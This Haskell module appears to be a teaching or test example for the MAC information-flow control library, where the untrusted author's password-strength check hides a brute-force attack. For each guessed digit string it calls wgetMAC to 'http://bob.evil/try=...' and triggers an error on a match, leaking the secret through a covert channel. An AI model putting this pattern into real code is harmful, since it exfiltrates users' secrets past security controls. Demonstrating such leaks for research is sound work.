{-# LANGUAGE Safe #-}
module Examples.Bob2 where

import Data.Maybe
import Data.List
import Data.List.Split

import MAC.MAC
import MAC.Lattice
import MAC.Labeled
import MAC.Control
import Control.Monad

import Examples.MACWget

-- Bob's code
common_pass :: Labeled H String -> MAC L (Labeled H Bool)
common_pass lpass = do
  attack lpass
  str <- wgetMAC "http://www.openwall.com/passwords/wordlists/password-2011.lst"
  let lines = filter (not.null) (linesBy (=='\n') str)
  let words = filter ( not . (=='#') . head ) lines
  joinMAC $ do
     pass <- unlabel lpass
     return $ isJust $ find (== pass) words

attack :: Labeled H String -> MAC L ()
attack lpass = do
  attempt <- wgetMAC "http://bob.evil/start.txt"
  when (attempt == "launch") $ return ()
  forM dict (guess lpass)
  return ()

dict =  filter (\l -> length l > 4 && length l < 7)
               (subsequences "0123456789")

guess :: Labeled H String -> String -> MAC L ()
guess lpass try = do
  joinMAC $ do
    fix (labelOf lpass)
    pass <- unlabel lpass
    when (pass == try) $ error "Unexpected error"
  wgetMAC $ "http://bob.evil/try="++try
  return ()
